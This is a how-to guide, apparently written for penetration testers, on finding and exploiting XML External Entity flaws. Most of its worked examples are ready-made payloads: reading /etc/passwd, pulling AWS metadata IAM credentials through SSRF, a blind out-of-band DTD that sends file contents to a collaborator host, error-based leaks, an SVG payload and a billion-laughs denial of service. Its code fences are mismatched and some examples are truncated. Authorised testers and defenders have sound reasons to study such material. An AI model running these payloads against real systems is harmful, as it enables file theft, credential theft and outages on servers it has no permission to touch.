# HOW TO TEST XXE (XML External Entity) ON A TARGET (2026 expert guide)
> **Author:** MD MAHABUBUR RAHMAN

## The N ways to test
1. Find XML ingestion: SOAP, SAML, uploads (.xml/.svg/.docx/.xlsx), RSS, XMPP, DTD in config.
2. In-band read: define <!ENTITY xxe SYSTEM "file:///etc/passwd"> -> value echoed.
3. Blind: OOB via YOUR SSH http server / Burp Collaborator / interactsh DNS.
4. Error-based blind: force a parse error to leak the file content in the stack trace.
5. XXE to SSRF: <!ENTITY SYSTEM "http://169.254.169.254/latest/meta-data/">.
6. XXE via extension wrappers: .svg (XSS), .docx/.xlsx (zip with [Content_Types].xml), PDF (JPEG in…), markdown in HTML-convert endpoints.
7. Parameter entities (blind) + external DTD hosted on yours.
8. Denial: billion-laughs (careful - lab only).

## Step-by-step on target
1. Probe ingestion: a field that last logged "xml", or post a <root/> and diff on errors.
2. Send the minimal in-band test (worked example 1) -> /etc/passwd in body?
3. If no echo, switch to OOB (worked example 4), listen on your http/dns.
4. If OOB fails, error-based (worked example 5) to force an error-with-content.
5. If that also fails and parser is vulnerable, try the SSRF-style internal read (metadata) for impact.
6. Verify it's real (not just xml parser passing text): non-file, non-URL external fetch must fail.

## Worked examples (concrete)
1. In-band file read:
```
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
2. In-band on a field: use inside any other element.
<?xml version="1.0"?>
<!DOCTYPE name [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
```
<search>username=&xxe;&gt;</search>
3. XXE->SSRF (AWS metadata):
```
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root>&xxe;</root>
4. Blind OOB (no echo) - host the DTD from XXE-exfil-server-side.dtd (sections A-F):
exfil.dtd (also included in the helper file):
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://YOUR-COLLABORATOR/?x=%file;'>">
%all;
victim request:
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR/attacker.dtd"> %remote;]>
<root/>
5. Error-based blind (steal in the error text):
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % file SYSTEM "file:///etc/passwd">
```
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;%error;]>
```
<root/>
6. SVG-with-XSS, if SVGs are uploaded as XML:
<svg xmlns="http://www.w3.org/2000/svg"><!ENTITY xxe SYSTEM "file:///etc/passwd"><text>&xxe;</text></svg>
7. Billion-laughs (LAB ONLY):
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">...]>
escalate i, each 10^n... consume memory - do NOT run on production.
```

## False positives
- Parser that strips DOCTYPE silently (allowlist) passes the text but errors on fetch -> no bug.
- PHP's libxml by default disabled external entities on newer builds - check the error you get.
- "could not parse XML" without any fetch = not XXE, likely just non-XML.
- DOCTYPE blocked but XInclude enabled = STILL vulnerable - test XInclude & XSLT next (see ultimate file).

## Tools
- xxestuff (0xacb), "XXE" Burp BApp generator, interactsh for OOB, your own http server: python3 -m http.server 80.
- Host all server-side DTDs from XXE-exfil-server-side.dtd; pair with client requests in
```
  "XXE Blind & Bypass Payloads 2026.txt" and the scan-order tree in xxe-2026-ultimate.txt.
```
